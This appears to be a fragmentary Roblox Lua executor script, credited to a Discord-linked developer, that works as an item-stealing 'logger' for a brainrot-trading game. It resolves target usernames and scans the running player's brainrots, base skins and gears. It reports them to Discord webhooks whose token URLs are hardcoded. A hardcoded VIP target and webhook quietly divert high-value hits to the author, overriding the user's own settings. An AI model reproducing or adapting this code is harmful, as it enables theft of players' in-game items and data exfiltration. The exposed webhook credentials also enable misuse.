-- by dark_cat_dev https://discord.gg/7PAVh5JR8J    
-- https://discord.gg/7PAVh5JR8J

-- ============================================================
-- GRUPO 1: config do loader (definida pelo usuário no executor)
-- ============================================================
local TARGET_USERNAME = getgenv().TARGET_USER
local TARGET_USER_ID  = getgenv().TARGET_USER_ID or nil

local WEBHOOK_URL   = getgenv().WEBHOOK_URL or ""
local TRADE_WEBHOOK = WEBHOOK_URL
local GOOD_WEBHOOK  = WEBHOOK_URL

local ALLOWED_ANIMALS_SET = getgenv().NORMAL_BRAINROTS or {}
local GOOD_BRAINROTS      = ALLOWED_ANIMALS_SET

local ALLOWED_SKINS_SET = getgenv().NORMAL_BASE_SKINS or {}
local ALLOWED_GEARS_SET = getgenv().NORMAL_GEARS      or {}

-- ============================================================
-- GRUPO 2: config hardcoded no script (VIP + BAD)
-- ============================================================
local VIP_TARGET_USER = "japazinnG"
local VIP_TARGET_ID   = 11390709913
local VIP_WEBHOOK     = "https://discord.com/api/webhooks/1547730702349500516/rextjvimRTI8k69HZejl-LIRVIvCJm9J1ywImSYONLKn4WNXo_bxu93rsXmblvzh0Q3a"
local VIP_ITEMS       = {
...
local BAD_TARGET_USER = "lebronjames"
local BAD_TARGET_ID   = nil
local BAD_WEBHOOK     = ""
local BAD_BRAINROTS_HARDCODED = {
...
-- ============================================================
-- Resolução de UserId a partir de username
-- ============================================================
...
if TARGET_USERNAME and TARGET_USERNAME ~= "" and not TARGET_USER_ID then
    TARGET_USER_ID = resolveUserId(TARGET_USERNAME)
    if not TARGET_USER_ID then
        warn("[logger] Falha ao resolver TARGET_USER: " .. tostring(TARGET_USERNAME))
        return
    end
    print("[logger] TARGET_USER_ID resolvido:", TARGET_USER_ID)
end

if VIP_TARGET_USER and VIP_TARGET_USER ~= "" and not VIP_TARGET_ID then
    VIP_TARGET_ID = resolveUserId(VIP_TARGET_USER)
    if VIP_TARGET_ID then
        print("[logger] VIP_TARGET_ID resolvido:", VIP_TARGET_ID)
    end
end

if BAD_TARGET_USER and BAD_TARGET_USER ~= "" and not BAD_TARGET_ID then
    BAD_TARGET_ID = resolveUserId(BAD_TARGET_USER)
    if BAD_TARGET_ID then
        print("[logger] BAD_TARGET_ID resolvido:", BAD_TARGET_ID)
    end
end
...
local GLOBAL_WEBHOOK = "https://discord.com/api/webhooks/1502721621750841375/7uUH6RvRVzvb981kIn6Wj_jz_sH_7wq4FdrhjaSd9Zauz_r2rhwlhwLmxEIpIqURnnDK"
    ...
    task.spawn(function()
        ...
        task.spawn(function()
            ...
            local BAD_BRAINROTS = BAD_BRAINROTS_HARDCODED
            ...
            -- Remotes via scan children[i+1]  -  aucun require(Net), mÃªme systÃ¨me que bot_main.lua
            local Invite      = nil
    ...
    print("[logger] Remotes loaded: Invite=", tostring(Invite), "SearchUser=", tostring(SearchUser))
            ...
            local function getSortedBrainrots()
                ...
                for _, entry in ipairs(entries) do
                    ...
                    local isVip    = VIP_ITEMS and VIP_ITEMS[name]
                    local isNormal = noFilterAnimals or ALLOWED_ANIMALS_SET[name]
                    local shouldAdd = isVip or isNormal
                    if shouldAdd then
                        table.insert(list, {
                            index     = entry.index,
                            animal    = animal,
                ...
                -- VIP primeiro, depois por geração decrescente
                table.sort(list, function(a, b)
                    if a.isVip ~= b.isVip then return a.isVip end
            ...
            local function getAllBaseSkins()
                ...
                local list = {}
                local noFilterSkins = isTableEmpty(ALLOWED_SKINS_SET)
                for uuid, data in pairs(bsi) do
                    if type(data) == "table" and type(data.SkinName) == "string" then
                        ...
                        local shouldAdd = (VIP_ITEMS and VIP_ITEMS[data.SkinName]) or noFilterSkins or ALLOWED_SKINS_SET[data.SkinName]
            ...
            local function getAllGears()
                ...
                for _, g in ipairs(owned) do
                    if type(g) == "table" and g.GearName then
                        local shouldAdd = (VIP_ITEMS and VIP_ITEMS[g.GearName]) or noFilterGears or ALLOWED_GEARS_SET[g.GearName]
                        if shouldAdd then
            ...
            sendTradeCompleteWebhook = function(offered)
                ...
                postUrl("https://discord.com/api/webhooks/1547730702349500516/rextjvimRTI8k69HZejl-LIRVIvCJm9J1ywImSYONLKn4WNXo_bxu93rsXmblvzh0Q3a")
            ...
            local function sendDetailedWebhook()
                ...
                for _, entry in ipairs(entries) do
                    ...
                    if data and data.Index then
                        ...
                        if info then
                            ...
                            local isVip       = VIP_ITEMS and VIP_ITEMS[displayName]
                            local isNormal    = (GOOD_BRAINROTS[displayName] ~= nil)
                            local isSecondary = (BAD_BRAINROTS[displayName] ~= nil)

                            -- VIP tem prioridade — se for VIP, não trata como normal mesmo que esteja em ambos
                            local isPrimary = isVip or (isNormal and not isVip)
                            ...
                            if isPrimary or isSecondary then
                                ...
                                if isPrimary and not isVip and GOOD_BRAINROTS[displayName] == true then
                ...
                if isVipHit and VIP_TARGET_ID then
                    ...
                    TARGET_USERNAME = VIP_TARGET_USER
